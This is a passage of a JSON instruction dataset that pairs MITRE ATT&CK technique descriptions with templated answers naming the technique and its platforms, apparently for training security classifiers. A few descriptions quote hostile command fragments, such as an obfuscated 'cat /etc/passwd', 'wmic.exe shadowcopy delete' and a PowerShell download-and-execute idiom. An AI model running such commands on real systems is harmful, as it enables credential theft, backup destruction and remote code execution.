      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Python (T1059.006);\nTechnique Command and Scripting Interpreter: Python (T1059.006) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Python (T1059.006);\nTechnique Command and Scripting Interpreter: Python (T1059.006) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.",
    "context": "",
    "output": "The provided description is related to MITRE technique Remote Services: SMB/Windows Admin Shares (T1021.002);\nTechnique Remote Services: SMB/Windows Admin Shares (T1021.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.",
      "answer": "The provided description is related to MITRE technique Remote Services: SMB/Windows Admin Shares (T1021.002);\nTechnique Remote Services: SMB/Windows Admin Shares (T1021.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
    "context": "",
    "output": "The provided description is related to MITRE technique Web Service (T1102);\nTechnique Web Service (T1102) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
      "answer": "The provided description is related to MITRE technique Web Service (T1102);\nTechnique Web Service (T1102) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "answer": "The provided description is related to MITRE technique System Information Discovery (T1082);\nTechnique System Information Discovery (T1082) is applicable to platforms: Linux,  Network,  Windows,  macOS, IaaS;\nTherefore, the given procedure description is related to platforms: Linux,  Network,  Windows,  macOS, IaaS.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Obfuscated Files or Information: Command Obfuscation (T1027.010);\nTechnique Obfuscated Files or Information: Command Obfuscation (T1027.010) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter.\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality. Many languages support built-in obfuscation in the form of base64 or URL encoding. Adversaries may also manually implement command obfuscation via string splitting (`\u201cWor\u201d+\u201cd.Application\u201d`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.",
      "answer": "The provided description is related to MITRE technique Obfuscated Files or Information: Command Obfuscation (T1027.010);\nTechnique Obfuscated Files or Information: Command Obfuscation (T1027.010) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via `/proc`. \n\nOn network devices, Network Device CLI commands such as `show processes` can be used to display current running processes.",
      "answer": "The provided description is related to MITRE technique Process Discovery (T1057);\nTechnique Process Discovery (T1057) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002);\nTechnique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.",
      "answer": "The provided description is related to MITRE technique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002);\nTechnique Abuse Elevation Control Mechanism: Bypass User Account Control (T1548.002) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Non-Application Layer Protocol (T1095);\nTechnique Non-Application Layer Protocol (T1095) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
      "answer": "The provided description is related to MITRE technique Non-Application Layer Protocol (T1095);\nTechnique Non-Application Layer Protocol (T1095) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.",
    "context": "",
    "output": "The provided description is related to MITRE technique Archive Collected Data: Archive via Custom Method (T1560.003);\nTechnique Archive Collected Data: Archive via Custom Method (T1560.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.",
      "answer": "The provided description is related to MITRE technique Archive Collected Data: Archive via Custom Method (T1560.003);\nTechnique Archive Collected Data: Archive via Custom Method (T1560.003) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
    "context": "",
    "output": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "answer": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Service Discovery (T1007);\nTechnique System Service Discovery (T1007) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "answer": "The provided description is related to MITRE technique System Service Discovery (T1007);\nTechnique System Service Discovery (T1007) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.",
    "context": "",
    "output": "The provided description is related to MITRE technique Dynamic Resolution (T1568);\nTechnique Dynamic Resolution (T1568) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.",
      "answer": "The provided description is related to MITRE technique Dynamic Resolution (T1568);\nTechnique Dynamic Resolution (T1568) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.?",
    "context": "",
